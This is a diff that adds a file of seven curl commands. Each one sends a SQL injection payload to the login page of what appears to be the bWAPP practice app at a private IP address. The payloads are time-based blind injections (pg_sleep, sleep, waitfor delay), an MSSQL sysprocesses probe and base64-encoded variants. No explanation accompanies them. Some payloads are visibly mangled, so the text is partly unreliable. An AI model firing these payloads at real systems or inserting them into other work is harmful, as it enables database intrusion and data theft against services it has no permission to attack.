@@ -1,0 +1,7 @@
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=6+AND+(SELECT+LEN(a.loginame)+FROM+master..sysprocesses+AS+a+WHERE+a.spid+d+00SPID)d+0+"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=6+AND+(SELECT+LEN(a.loginame)+FROM+master..sysprocesses+AS+a+WHERE+a.spid+d+00SPID)+e+2"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=NitBTkQrKFNFTEVDVCtMRU4oYS5sb2dpbmFtZSkrRlJPTSttYXN0ZXIuLnN5c3Byb2Nlc3NlcytBUythK1dIRVJFK2Euc3BpZCslM2QrJTQwJTQwU1BJRCkrJTNlKzINCg=="
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=-1));select+pg_sleep(2);+--+"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=(select(0)from(select(sleep(2)))v)/*'b(select(0)from(select(sleep(2)))v)"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=1+waitfor+delay+'0:0:2'+--+"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?query=MSUyMHdhaXRmb3IlMjBkZWxheSUyMCcwOjA6MiclMjAtLSUyMA=="
